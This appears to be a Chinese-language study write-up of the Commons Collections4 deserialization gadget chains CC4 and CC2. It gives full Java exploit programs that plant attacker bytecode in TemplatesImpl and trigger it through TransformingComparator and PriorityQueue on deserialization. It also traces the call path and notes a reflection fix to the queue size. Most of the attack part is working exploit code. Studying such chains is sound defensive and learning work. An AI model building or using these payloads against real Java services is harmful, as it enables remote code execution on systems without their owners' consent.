# CC4
# 完整exp：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {

        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
        Field sizeField = priorityQueueClass.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue, 2);

        serialize(priorityQueue);

        unserialize("person.txt");

    }



    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
        oos.writeObject(obj);
        System.out.println("序列化完成");
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        System.out.println("反序列化"+Filename +"完成");
        return obj;
    }
}
```

# 分析

cc4改的是触发transform的前半段过程，所以后半段的任意代码执行可以和cc3一样

```java
TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

这段是直接赋值cc3的，接下来我们要触发`chainedTransformer`的`transform`方法。

查看用法，有很多，作者找的是`TransformingComparator`的`compare`方法

```
public int compare(I obj1, I obj2) {
        O value1 = (O)this.transformer.transform(obj1);
        O value2 = (O)this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
```

这里触发了`transformer`的`transform`方法，而这里的`transformer`参数可以控制。可以看一下构造方法

```java
    public TransformingComparator(Transformer<? super I, ? extends O> transformer) {
        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
    }
```

直接传入`chainedTransformer`就好了。现在我们要找的是怎么去触发`compare`方法。

**这里的**`**compare**`**方法实现有很多，没啥逻辑，都靠开发的经验。**

作者找到了`PriorityQueue`类。这里有`readObject`方法

```java
   private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
```

这里最后调用了`heapify`方法，跟进去。

```java
private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

这里又调用了`siftDowm，继续跟进`

```java
private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
```

跟进 `siftDownUsingComparator`

```java
private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

可以看到 `siftDownUsingComparator`中调用了`compare`，链子完成

**注意还要把**`**TransformingComparator**`**传入**`**PriorityQueue**`**，看一下构造方法，可以直接传入**`**Comparator**`

```java
public PriorityQueue(Comparator<? super E> comparator) {
    this(DEFAULT_INITIAL_CAPACITY, comparator);
}
```

直接调用对应的构造方法。完成exp：

```java
 public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {

        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
     
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        serialize(priorityQueue);
        unserialize("person.txt");
```

这里执行没有完成rce，打断点调试

# 调试

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1759030975249-fe7f65ae-6333-4626-abcd-13dc35440796.png)

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1759031019249-1a50f7ec-f4a6-4ac4-8350-84bddb1516ae.png)

看到这里直接跳过了`siftDown`，看了一下因为size是0。

，不太懂这个位运算，都是反正不能为0。好像要size=2，就可以进去。组长这里是又进去调试了一下，我这里试了一下，可以直接反射改size的值就好了。

```java
Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
        Field sizeField = priorityQueueClass.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue, 2);
```

到这里就好了

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1759031262114-3a8ac198-c9ed-48e4-a4c2-c101ea20df9b.png)


# CC2
# 完整exp：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);

        //看效果的
//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates,new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
//        invokerTransformer.transform( templates);
        

        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);

        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
        Field sizeField = priorityQueueClass.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue, 2);



        serialize(priorityQueue);

        unserialize("person.txt");
    }


    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
        oos.writeObject(obj);
        System.out.println("序列化完成");
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        System.out.println("反序列化"+Filename +"完成");
        return obj;
    }
}
```

这里和cc4差不多，只是不用chainedTransformer了，直接用InvokerTransformer，执行transformer方法

我这里还是用反射直接改了size，都是这里没有用到ConstantTransformer传参数了，所以add了一个templates进去